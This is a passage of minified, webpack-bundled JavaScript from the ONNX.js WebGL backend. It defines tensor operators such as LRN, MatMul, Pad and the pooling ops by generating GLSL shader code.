type.");if(4!==inputs[0].dims.length)throw new Error("Only support 4-D input shape.")}},"./lib/onnxjs/backends/webgl/ops/lrn.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createLrnProgramInfoLoader=exports.parseLrnAttributes=exports.lrn=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.lrn=(inferenceHandler,inputs,attributes)=>(validateInputs(inputs),[inferenceHandler.run(createLrnProgramInfoLoader(inputs,attributes),inputs)]);exports.parseLrnAttributes=node=>{const alpha=node.attributes.getFloat("alpha",1e-4),beta=node.attributes.getFloat("beta",.75),bias=node.attributes.getFloat("bias",1),size=node.attributes.getInt("size");return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({alpha:alpha,beta:beta,bias:bias,size:size})};const lrnProgramMetadata={name:"LRN",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked]};function createLrnProgramInfoLoader(inputs,attributes){return Object.assign(Object.assign({},lrnProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>function createLrnProgramInfo(inputs,attributes){const C=inputs[0].dims[1],rank=inputs[0].dims.length,from=-Math.floor((attributes.size-1)/2),to=Math.ceil((attributes.size-1)/2),alpha=`float(${attributes.alpha}) / float(${attributes.size})`,shaderSource=`\n    float process(int indices[${rank}]) {\n        int c = indices[1];\n        float x = _X(indices);\n        float square_sum = 0.0;\n\n        for (int i = ${from}; i <= ${to}; i++) {\n          int idx = c + i;\n          if (c >= 0 && c < ${C}) {\n            indices[1] = idx;\n            float j = _X(indices);\n            square_sum += j * j;\n          }\n        }\n        return x / pow(float(${attributes.bias}) + ${alpha} * square_sum, float(${attributes.beta}));\n    }`;return Object.assign(Object.assign({},lrnProgramMetadata),{cacheHint:attributes.cacheKey,output:{dims:inputs[0].dims,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})}(inputs,attributes)})}exports.createLrnProgramInfoLoader=createLrnProgramInfoLoader;const validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("LRN requires 1 input.");if(4!==inputs[0].dims.length)throw new Error('currently only support LRN for input with "NCHW" format');if("float32"!==inputs[0].type)throw new Error("input should be float type")}},"./lib/onnxjs/backends/webgl/ops/matmul-pack.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createPackedMatmulProgramInfoLoader=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts"),fuse_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/fuse-utils.ts"),matmul_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/matmul.ts"),createPackedMatmulProgramInfo=(inferenceHandler,metadata,inputs,activationAttributes)=>{const hasBias=inputs.length>2,processBias=hasBias?"value += getBiasForMatmul();":"",aShape=inputs[0].dims,bShape=inputs[1].dims,outputShape=util_1.BroadcastUtil.calcShape(aShape,bShape,!0),isBroadcast=!util_1.ShapeUtil.areEqual(inputs[0].dims,inputs[1].dims);if(!outputShape)throw new Error("Can't use matmul on the given tensors");const sharedDim=aShape[aShape.length-1],sharedDimIndex=Math.ceil(sharedDim/2),aRank=aShape.length,bRank=bShape.length,glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),coordsDataType=(0,utils_1.getCoordsDataType)(outputShape.length),outRank=outputShape.length,allGlChannels=(0,utils_1.getGlChannels)(),{activationFunction:activationFunction,applyActivation:applyActivation}=(0,fuse_utils_1.getActivationSnippet)(activationAttributes),getBiasForMatmulSnippet=hasBias?`${(0,matmul_1.getBiasForMatmul)(coordsDataType,allGlChannels,inputs[2].dims,outputShape,!0)}`:"",getBcastedSamplerForMatmulSnippet=isBroadcast?`${function getBcastSamplerForMatmul(coordsDataType,allGlChannels,inputs,outShape){let unpackedACoordsSnippet=[],unpackedBCoordsSnippet=[];const inAShape=inputs[0].dims,inBShape=inputs[1].dims,inARank=inAShape.length,inBRank=inBShape.length,outRank=outShape.length,rankADiff=outRank-inARank,rankBDiff=outRank-inBRank;unpackedACoordsSnippet=inAShape.map(((s,i)=>`coords.${allGlChannels[i+rankADiff]}`)),unpackedACoordsSnippet[inARank-1]="i*2",unpackedACoordsSnippet.join(", "),unpackedBCoordsSnippet=inBShape.map(((s,i)=>`coords.${allGlChannels[i+rankBDiff]}`)),unpackedBCoordsSnippet[inBRank-2]="i*2",unpackedBCoordsSnippet.join(", ");const broadcastADims=util_1.BroadcastUtil.getBroadcastDims(inAShape,outShape),broadcastBDims=util_1.BroadcastUtil.getBroadcastDims(inBShape,outShape),coordsASnippet=broadcastADims.map((d=>`coords.${allGlChannels[d+rankADiff]} = 0;`)).join("\n"),coordsBSnippet=broadcastBDims.map((d=>`coords.${allGlChannels[d+rankBDiff]} = 0;`)).join("\n"),swapDimSnippet=`int lastDim = coords.${allGlChannels[outRank-1]};\n  coords.${allGlChannels[outRank-1]} = coords.${allGlChannels[outRank-2]};\n  coords.${allGlChannels[outRank-2]} = lastDim;`,getBcastSamplerMatmulSource=`\nvec4 getAAtOutCoordsMatmul(int i) {\n  ${coordsDataType} coords = getOutputCoords();\n  ${swapDimSnippet}\n  ${coordsASnippet}\n  vec4 outputValue = getA(${unpackedACoordsSnippet});\n  return outputValue;\n}\n\nvec4 getBAtOutCoordsMatmul(int i) {\n  ${coordsDataType} coords = getOutputCoords();\n  ${swapDimSnippet}\n  ${coordsBSnippet}\n  vec4 outputValue = getB(${unpackedBCoordsSnippet});\n  return outputValue;\n}`;return getBcastSamplerMatmulSource}(coordsDataType,allGlChannels,inputs,outputShape)}`:"",getSamplerAInLoopSnippet=isBroadcast?"getAAtOutCoordsMatmul(i)":`getA(${function getA(allGlChannels,rank){let res="";for(let i=0;i<rank-2;i++)res+=`rc.${allGlChannels[i]}, `;return res+=`rc.${allGlChannels[rank-2]}, i*2`,res}(allGlChannels,aRank)})`,getSamplerBInLoopSnippet=isBroadcast?"getBAtOutCoordsMatmul(i)":`getB(${function getB(allGlChannels,rank){let res="";for(let i=0;i<rank-2;i++)res+=`rc.${allGlChannels[i]}, `;return res+=`i*2, rc.${allGlChannels[rank-1]}`,res}(allGlChannels,bRank)})`,shaderSource=`\n            ${getBcastedSamplerForMatmulSnippet}\n            ${getBiasForMatmulSnippet}\n            ${activationFunction}\n            void main() {\n              ${isBroadcast?"":`${coordsDataType} rc =\n          getOutputCoords(); int lastDim = rc.${allGlChannels[outRank-1]}; rc.${allGlChannels[outRank-1]} =\n          rc.${allGlChannels[outRank-2]}; rc.${allGlChannels[outRank-2]} = lastDim;\n      `}\n\n              vec4 value = vec4(0);\n              for (int i = 0; i < ${sharedDimIndex}; i++) {\n                vec4 a = ${getSamplerAInLoopSnippet};\n                vec4 b = ${getSamplerBInLoopSnippet};\n\n                value += (a.rrbb * b.rgrg);\n                value += (a.ggaa * b.baba);\n              }\n              ${processBias}\n              ${applyActivation}\n              ${glsl.output} = value;\n            }`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.packed},shaderSource:shaderSource,hasMain:!0})};exports.createPackedMatmulProgramInfoLoader=(inferenceHandler,inputs,activationAttributes)=>{const metadata=(hasBias=inputs.length>2,cacheHint=activationAttributes.activationCacheKey,{name:"MatMul (packed)",inputNames:hasBias?["A","B","Bias"]:["A","B"],inputTypes:hasBias?[types_1.TextureType.packed,types_1.TextureType.packed,types_1.TextureType.packed]:[types_1.TextureType.packed,types_1.TextureType.packed],cacheHint:cacheHint});var hasBias,cacheHint;return Object.assign(Object.assign({},metadata),{get:()=>createPackedMatmulProgramInfo(inferenceHandler,metadata,inputs,activationAttributes)})}},"./lib/onnxjs/backends/webgl/ops/matmul.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.getBiasForMatmul=exports.createMatmulProgramInfoLoader=exports.parseMatMulAttributes=exports.matMul=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts"),fuse_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/fuse-utils.ts"),matmul_pack_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/matmul-pack.ts");exports.matMul=(inferenceHandler,inputs,attributes)=>(validateInputs(inputs),inferenceHandler.session.pack?[inferenceHandler.run((0,matmul_pack_1.createPackedMatmulProgramInfoLoader)(inferenceHandler,inputs,attributes),inputs)]:[inferenceHandler.run(createMatmulProgramInfoLoader(inputs,attributes),inputs)]);exports.parseMatMulAttributes=node=>(0,fuse_utils_1.parseInternalActivationAttributes)(node.attributes);const createMatmulProgramMetadata=(hasBias,cacheHint)=>({name:"MatMul",inputNames:hasBias?["A","B","Bias"]:["A","B"],inputTypes:hasBias?[types_1.TextureType.unpacked,types_1.TextureType.unpacked,types_1.TextureType.unpacked]:[types_1.TextureType.unpacked,types_1.TextureType.unpacked],cacheHint:cacheHint});function createMatmulProgramInfoLoader(inputs,activationAttributes){const metadata=createMatmulProgramMetadata(inputs.length>2,activationAttributes.activationCacheKey);return Object.assign(Object.assign({},metadata),{get:()=>function createMatmulProgramInfo(metadata,inputs,activationAttributes){const aShape=inputs[0].dims,bShape=inputs[1].dims,outputShape=util_1.BroadcastUtil.calcShape(aShape,bShape,!0);if(!outputShape)throw new Error("Can't use matmul on the given tensors");const coordsDataType=(0,utils_1.getCoordsDataType)(outputShape.length),allGlChannels=(0,utils_1.getGlChannels)(),{activationFunction:activationFunction,applyActivation:applyActivation}=(0,fuse_utils_1.getActivationSnippet)(activationAttributes),hasBias=inputs.length>2,processBias=hasBias?"value += getBiasForMatmul();":"",getBiasForMatmulSnippet=hasBias?`${getBiasForMatmul(coordsDataType,allGlChannels,inputs[2].dims,outputShape,!1)}`:"",rank=outputShape.length,arank=aShape.length,brank=bShape.length,shaderSource=`\n    ${activationFunction}\n    ${getBiasForMatmulSnippet}\n    float process(int indices[${rank}]) {\n        int a[${arank}];\n        int b[${brank}];\n        bcastMatmulIndices_A(indices, a);\n        bcastMatmulIndices_B(indices, b);\n\n        float value;\n        for (int k=0; k<${aShape[aShape.length-1]}; ++k) {\n            a[${arank-1}] = k;\n            b[${brank-2}] = k;\n            value += _A(a) * _B(b);\n        }\n        ${processBias}\n        ${applyActivation}\n        return value;\n    }`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})}(metadata,inputs,activationAttributes)})}exports.createMatmulProgramInfoLoader=createMatmulProgramInfoLoader;const validateInputs=inputs=>{if(!inputs||2!==inputs.length)throw new Error("MatMul requires 2 inputs.");if(inputs[0].dims[inputs[0].dims.length-1]!==inputs[1].dims[inputs[1].dims.length-2])throw new Error("shared dimension does not match.");if("float32"!==inputs[0].type&&"float64"!==inputs[0].type||"float32"!==inputs[1].type&&"float64"!==inputs[1].type)throw new Error("inputs should be float type");if(inputs[0].type!==inputs[1].type)throw new Error("inputs types should match")};function getBiasForMatmul(coordsDataType,allGlChannels,inShape,outShape,isPacked){let unpackedCoordsSnippet="";const inRank=inShape.length,outRank=outShape.length,rankDiff=outRank-inRank;unpackedCoordsSnippet=outRank<2&&inRank>0?"coords":inShape.map(((s,i)=>`coords.${allGlChannels[i+rankDiff]}`)).join(", ");const coordsSnippet=util_1.BroadcastUtil.getBroadcastDims(inShape,outShape).map((d=>`coords.${allGlChannels[d+rankDiff]} = 0;`)).join("\n");let output="vec4(outputValue.xx, outputValue.yy)";1===util_1.ShapeUtil.size(inShape)&&(output="vec4(outputValue.x)");return isPacked?`\nvec4 getBiasForMatmul() {\n  ${coordsDataType} coords = getOutputCoords();\n  ${coordsSnippet}\n  vec4 outputValue = getBias(${unpackedCoordsSnippet});\n  return ${output};\n}`:`\nfloat getBiasForMatmul() {\n  ${coordsDataType} coords = getOutputCoords();\n  ${coordsSnippet}\n  return getBias(coords.x);\n}`}exports.getBiasForMatmul=getBiasForMatmul},"./lib/onnxjs/backends/webgl/ops/pack.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createPackProgramInfoLoader=void 0;const glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts"),packing_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/packing-utils.ts"),packProgramMetadata={name:"pack",inputNames:["A"],inputTypes:[types_1.TextureType.unpackedReversed]};exports.createPackProgramInfoLoader=(handler,input)=>Object.assign(Object.assign({},packProgramMetadata),{get:()=>((handler,input)=>{const glsl=(0,glsl_source_1.getGlsl)(handler.session.backend.glContext.version),inputShape=input.dims,inputRank=inputShape.length,outputRank=input.dims.length,coordsDataType=(0,utils_1.getCoordsDataType)(outputRank),channels=(0,packing_utils_1.getChannels)("rc",outputRank),setup=function getSetup(rank,dims,rows,cols){return 0===rank||1===rank?"":`\n    int r = ${dims[rank-2]};\n    int c = ${dims[rank-1]};\n    int rp1 = ${dims[rank-2]} + 1;\n    int cp1 = ${dims[rank-1]} + 1;\n    bool rEdge = rp1 >= ${cols};\n    bool cEdge = cp1 >= ${rows};\n    `}(outputRank,channels,inputShape[inputShape.length-2],inputShape[inputShape.length-1]);let reversedInputWH;reversedInputWH=0===inputRank?[1,1]:1===inputRank?[inputShape[0],1]:[inputShape[outputRank-1],inputShape[outputRank-2]];const outOfBoundsCondition=function getOutOfBoundsCondition(rank,shape,dims){if(0===rank)return"false";if(1===rank)return`rc > ${shape[0]}`;let cond="";for(let i=rank-2;i<rank;i++)cond+=`${dims[i]} >= ${shape[i-rank+2]}`,i<rank-1&&(cond+="||");return cond}(outputRank,reversedInputWH,channels),output=function getOutput(shape,dims){const rank=shape.length;if(0===rank)return"getA(), 0, 0, 0";if(1===rank)return`getA(rc),\n            rc + 1 >= ${shape[0]} ? 0. : getA(rc + 1),\n            0, 0`;const coord00="r, c",coord01="r, cp1",coord10="rp1, c",coord11="rp1, cp1";let D="";if(rank>2)for(let i=0;i<rank-2;++i)D+=`${dims[i]},`;return`getA(${D}${coord00}),\n          rEdge ? 0. : getA(${D}${coord10}),\n          cEdge ? 0. : getA(${D}${coord01}),\n          rEdge || cEdge ? 0. : getA(${D}${coord11})`}(inputShape,channels),shaderSource=`\n        void main() {\n          ${coordsDataType} rc = getOutputCoords();\n\n          if(${outOfBoundsCondition}) {\n            ${glsl.output} = vec4(0);\n          } else {\n            ${setup}\n\n            ${glsl.output} = vec4(${output});\n          }\n        }\n      `;return Object.assign(Object.assign({},packProgramMetadata),{hasMain:!0,output:{dims:input.dims,type:input.type,textureType:types_1.TextureType.packed},shaderSource:shaderSource})})(handler,input)})},"./lib/onnxjs/backends/webgl/ops/packing-utils.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.unpackFromChannel=exports.getChannels=exports.getVecChannels=void 0;const utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts");function getVecChannels(name,rank){return(0,utils_1.getGlChannels)(rank).map((d=>`${name}.${d}`))}exports.getVecChannels=getVecChannels,exports.getChannels=function getChannels(name,rank){return 1===rank?[name]:getVecChannels(name,rank)},exports.unpackFromChannel=function unpackFromChannel(){return"\n    float getChannel(vec4 frag, int dim) {\n      int modCoord = imod(dim, 2);\n      return modCoord == 0 ? frag.r : frag.g;\n    }\n\n    float getChannel(vec4 frag, vec2 innerDims) {\n      vec2 modCoord = mod(innerDims, 2.);\n      return modCoord.x == 0. ?\n        (modCoord.y == 0. ? frag.r : frag.g) :\n        (modCoord.y == 0. ? frag.b : frag.a);\n    }\n  "}},"./lib/onnxjs/backends/webgl/ops/pad.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parsePadAttributesV11=exports.padV11=exports.parsePadAttributesV2=exports.padV2=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),padProgramMetadata={name:"Pad",inputNames:["A"],inputTypes:[types_1.TextureType.unpacked]};exports.padV2=(inferenceHandler,inputs,attributes)=>{validateInputsV2(inputs);return[inferenceHandler.run(Object.assign(Object.assign({},padProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>createPadProgramInfo(inferenceHandler,inputs[0],attributes)}),inputs)]};exports.parsePadAttributesV2=node=>{const mode=node.attributes.getString("mode","constant"),value=node.attributes.getFloat("value",0),pads=node.attributes.getInts("pads");return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({mode:mode,value:value,pads:pads})};exports.padV11=(inferenceHandler,inputs,mode)=>{validateInputsV11(inputs);const attrubutes=generatePadAttributesFromInputs(inferenceHandler,inputs,mode);return(0,exports.padV2)(inferenceHandler,[inputs[0]],attrubutes)};exports.parsePadAttributesV11=node=>node.attributes.getString("mode","constant");const generatePadAttributesFromInputs=(inferenceHandler,inputs,mode)=>{if(!inferenceHandler.session.isInitializer(inputs[1].dataId)||inputs.length>=3&&!inferenceHandler.session.isInitializer(inputs[2].dataId))throw new Error("dynamic pad attributes are not allowed");const pads=Array.from(inputs[1].integerData),value=inputs.length>=3?inputs[2].floatData[0]:0;return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({mode:mode,pads:pads,value:value})},createPadProgramInfo=(inferenceHandler,input,attributes)=>{const outputShape=util_1.ShapeUtil.padShape(input.dims.slice(),attributes.pads),rank=outputShape.length,shaderSource=`\n      ${getPadFunction(inferenceHandler,input,attributes)}\n      float process(int[${rank}] indices) {\n          return padA(indices);\n      }`;return{name:"Pad",inputNames:["A"],inputTypes:[types_1.TextureType.unpacked],output:{dims:outputShape,type:input.type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource}},validateInputsV2=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Pad requires 1 input");if("float32"!==inputs[0].type&&"float64"!==inputs[0].type)throw new Error("Invalid input type.")},validateInputsV11=inputs=>{if(!inputs||2!==inputs.length&&3!==inputs.length)throw new Error("Pad requires 2 or 3 inputs");if("int32"!==inputs[1].type)throw new Error("Invalid input type.");if(inputs.length>=3&&"string"===inputs[2].type)throw new Error("Invalid input type.")},getPadFunction=(inferenceHandler,input,attributes)=>{const glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),[width,height]=inferenceHandler.calculateTextureWidthAndHeight(input.dims,types_1.TextureType.unpacked),strides=util_1.ShapeUtil.computeStrides(input.dims);switch(attributes.mode){case"constant":return getPadConstant(glsl,input.dims,strides,width,height,attributes.pads,attributes.value);case"reflect":return getPadReflect(glsl,input.dims,strides,width,height,attributes.pads);case"edge":return getPadEdge(glsl,input.dims,strides,width,height,attributes.pads);default:throw new Error("Invalid mode")}},getPadConstant=(glsl,shape,strides,width,height,pads,value)=>{const rank=shape.length;let block="";for(let i=rank-1;i>=0;--i)block+=`\n        k = m[${i}] - ${pads[i]};\n        if (k < 0)  return constant;\n        if (k >= ${shape[i]}) return constant;\n        offset += k * ${strides[i]};\n        `;return`\n      float padA(int m[${rank}]) {\n        const float constant = float(${value});\n        int offset = 0;\n        int k = 0;\n        ${block}\n        vec2 coords = offsetToCoords(offset, ${width}, ${height});\n        float value = getColorAsFloat(${glsl.texture2D}(A, coords));\n        return value;\n      }\n      `},getPadReflect=(glsl,shape,strides,width,height,pads)=>{const rank=shape.length;let block="";for(let i=rank-1;i>=0;--i)block+=`\n        k = m[${i}] - ${pads[i]};\n        if (k < 0) { k = -k; }\n        {\n          const int _2n_1 = ${2*(shape[i]-1)};\n          k = int( mod( float(k), float(_2n_1) ) ) ;\n          if(k >= ${shape[i]}) { k = _2n_1 - k; }\n        }\n        offset += k * ${strides[i]};\n        `;return`\n      float padA(int m[${rank}]) {\n        int offset = 0;\n        int k = 0;\n        ${block}\n        vec2 coords = offsetToCoords(offset, ${width}, ${height});\n        float value = getColorAsFloat(${glsl.texture2D}(A, coords));\n        return value;\n      }\n      `},getPadEdge=(glsl,shape,strides,width,height,pads)=>{const rank=shape.length;let block="";for(let i=rank-1;i>=0;--i)block+=`\n        k = m[${i}] - ${pads[i]};\n        if (k < 0)  k = 0;\n        if (k >= ${shape[i]}) k = ${shape[i]-1};\n        offset += k * ${strides[i]};\n      `;return`\n      float padA(int m[${rank}]) {\n        int offset = 0;\n        int k = 0;\n        ${block}\n        vec2 coords = offsetToCoords(offset, ${width}, ${height});\n        float value = getColorAsFloat(${glsl.texture2D}(A, coords));\n        return value;\n      }\n      `}},"./lib/onnxjs/backends/webgl/ops/pool.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.globalMaxPool=exports.parseMaxPoolAttributes=exports.maxPool=exports.parseGlobalAveragePoolAttributes=exports.globalAveragePool=exports.parseAveragePoolAttributes=exports.averagePool=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.averagePool=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);const metadata={name:"AveragePool",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked],cacheHint:attributes.cacheKey};return[inferenceHandler.run(Object.assign(Object.assign({},metadata),{get:()=>createAveragePoolProgramInfo(inputs,metadata,!1,attributes)}),inputs)]};exports.parseAveragePoolAttributes=node=>{const autoPad=node.attributes.getString("auto_pad","NOTSET"),ceilMode=node.attributes.getInt("ceil_mode",0),countIncludePad=0!==node.attributes.getInt("count_include_pad",0),kernelShape=node.attributes.getInts("kernel_shape"),strides=node.attributes.getInts("strides",[]),pads=node.attributes.getInts("pads",[]);if(0!==ceilMode)throw new Error("using ceil() in shape computation is not yet supported for AveragePool");return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({autoPad:autoPad,ceilMode:ceilMode,countIncludePad:countIncludePad,kernelShape:kernelShape,strides:strides,pads:pads})};const createAveragePoolProgramInfo=(inputs,metadata,isGlobalOperator,attributes)=>{const[adjustedAttributes,outputShape]=getAdjustedPoolAttributesAndOutputShape(inputs,attributes,isGlobalOperator),kernelSize=util_1.ShapeUtil.size(adjustedAttributes.kernelShape);let op2="";adjustedAttributes.countIncludePad?op2+=`value /= float(${kernelSize});`:op2+=`value /= float(${kernelSize} - pad);`;const shaderSource=`\n        ${generatePoolingCode(inputs[0].dims,adjustedAttributes,"value += _X(x);",op2,"0.0")}\n      `;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})};exports.globalAveragePool=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);const metadata={name:"GlobalAveragePool",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked],cacheHint:`${attributes.countIncludePad}`};return[inferenceHandler.run(Object.assign(Object.assign({},metadata),{get:()=>createAveragePoolProgramInfo(inputs,metadata,!0,attributes)}),inputs)]};exports.parseGlobalAveragePoolAttributes=node=>{const countIncludePad=0!==node.attributes.getInt("count_include_pad",0);return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({autoPad:"",ceilMode:0,countIncludePad:countIncludePad,kernelShape:[],strides:[],pads:[]})};exports.maxPool=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);const metadata={name:"MaxPool",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked],cacheHint:attributes.cacheKey};return[inferenceHandler.run(Object.assign(Object.assign({},metadata),{get:()=>createMaxPoolProgramInfo(inputs,metadata,!1,attributes)}),inputs)]};exports.parseMaxPoolAttributes=node=>{const autoPad=node.attributes.getString("auto_pad","NOTSET"),ceilMode=node.attributes.getInt("ceil_mode",0),kernelShape=node.attributes.getInts("kernel_shape"),strides=node.attributes.getInts("strides",[]),pads=node.attributes.getInts("pads",[]),storageOrder=node.attributes.getInt("storage_order",0),dilations=node.attributes.getInts("dilations",[]);if(0!==storageOrder)throw new Error("column major storage order is not yet supported for MaxPool");if(0!==ceilMode)throw new Error("using ceil() in shape computation is not yet supported for MaxPool");return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({autoPad:autoPad,ceilMode:ceilMode,countIncludePad:!1,kernelShape:kernelShape,strides:strides,pads:pads,storageOrder:storageOrder,dilations:dilations})};const createMaxPoolProgramInfo=(inputs,metadata,isGlobalOperator,attributes)=>{const[adjustedAttributes,outputShape]=getAdjustedPoolAttributesAndOutputShape(inputs,attributes,isGlobalOperator),shaderSource=`\n      ${generatePoolingCode(inputs[0].dims,adjustedAttributes,"\n      value = max(_X(x), value);\n    ","","-1e5")}\n    `;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},getAdjustedPoolAttributesAndOutputShape=(inputs,attributes,isGlobalOperator)=>{const inputShape=inputs[0].dims.slice(),hasDilations=Object.hasOwnProperty.call(attributes,"dilations"),kernelShape=attributes.kernelShape.slice(),strides=attributes.strides.slice(),dilations=hasDilations?attributes.dilations.slice():[],pads=attributes.pads.slice();util_1.PoolConvUtil.adjustPoolAttributes(isGlobalOperator,inputShape,kernelShape,strides,dilations,pads);const outputShape=util_1.PoolConvUtil.computePoolOutputShape(isGlobalOperator,inputShape,strides,dilations,kernelShape,pads,attributes.autoPad),newAttributes=Object.assign({},attributes);return hasDilations?Object.assign(newAttributes,{kernelShape:kernelShape,strides:strides,pads:pads,dilations:dilations,cacheKey:attributes.cacheKey}):Object.assign(newAttributes,{kernelShape:kernelShape,strides:strides,pads:pads,cacheKey:attributes.cacheKey}),[newAttributes,outputShape]},globalMaxPoolAttributes={autoPad:"",ceilMode:0,countIncludePad:!1,kernelShape:[],strides:[],pads:[],storageOrder:0,dilations:[],cacheKey:""},globalMaxPoolMetadata={name:"GlobalMaxPool",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked]};exports.globalMaxPool=(inferenceHandler,inputs)=>{validateInputs(inputs);return[inferenceHandler.run(Object.assign(Object.assign({},globalMaxPoolMetadata),{get:()=>createMaxPoolProgramInfo(inputs,globalMaxPoolMetadata,!0,globalMaxPoolAttributes)}),inputs)]};const validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Pool ops requires 1 input.");if("float32"!==inputs[0].type&&"float64"!==inputs[0].type)throw new Error("Invalid input type.")},generatePoolingCode=(inputDims,attributes,op1,op2,start)=>{const rank=inputDims.length;if(attributes.kernelShape.length<=2){const kw=attributes.kernelShape[attributes.kernelShape.length-1],sw=attributes.strides[attributes.strides.length-1],pwStart=attributes.pads[attributes.pads.length/2-1],pwEnd=attributes.pads[attributes.pads.length-1],dimW=inputDims[rank-1];let codeW="",codeH="",codeHEnd="";if(codeW=pwStart+pwEnd!==0?`\n          for (int i = 0; i < ${kw}; i++) {\n            x[${rank} - 1] = indices[${rank} - 1] * ${sw} - ${pwStart} + i;\n            if (x[${rank} - 1] < 0 || x[${rank} - 1] >= ${dimW}) {\n              pad++;\n              continue;\n            }\n            ${op1}\n          }`:`\n          for (int i = 0; i < ${kw}; i++) {\n            x[${rank} - 1] = indices[${rank} - 1] * ${sw} - ${pwStart} + i;\n            ${op1}\n          }`,2===attributes.kernelShape.length){const kh=attributes.kernelShape[attributes.kernelShape.length-2],sh=attributes.strides[attributes.strides.length-2],phStart=attributes.pads[attributes.pads.length/2-2],phEnd=attributes.pads[attributes.pads.length-2],dimH=inputDims[rank-2];codeH=phStart+phEnd!==0?`\n            for (int j = 0; j < ${kh}; j++) {\n              x[${rank} - 2] = indices[${rank} - 2] * ${sh} - ${phStart} + j;\n              if (x[${rank} - 2] < 0 || x[${rank} - 2] >= ${dimH}) {\n                pad+= ${kw};\n                continue;\n              }\n          `:`\n            for (int j = 0; j < ${kh}; j++) {\n              x[${rank} - 2] = indices[${rank} - 2] * ${sh} - ${phStart} + j;\n            `,codeHEnd="\n          }\n        "}return`\n        float process(int indices[${rank}]) {\n          int x[${rank}];\n          copyVec(indices, x);\n\n          float value = ${start};\n          int pad = 0;\n          ${codeH}\n          ${codeW}\n          ${codeHEnd}\n          ${op2}\n          return value;\n        }\n      `}{const kernelSize=util_1.ShapeUtil.size(attributes.kernelShape),kernelStrides=util_1.ShapeUtil.computeStrides(attributes.kernelShape),stridesRank=kernelStrides.length,padsRank=attributes.pads.length,offsetToIndicesFunction=offsetToIndices(stridesRank),copyInputDims=copyArray(inputDims,"inputDims"),copyPads=copyArray(attributes.pads,"pads"),copyKernelStrides=copyArray(kernelStrides,"kernelStrides"),copyStrides=copyArray(attributes.strides,"strides");let padCode="";padCode=attributes.pads.reduce(((sum,cur)=>sum+cur))?`\n            if (x[j] >= inputDims[j] || x[j] < 0) {\n              pad++;\n              isPad = true;\n              break;\n            }\n          }\n          if (!isPad) {\n            ${op1}\n          }`:`\n          }\n          ${op1}\n        `;return`\n        ${offsetToIndicesFunction}\n        float process(int 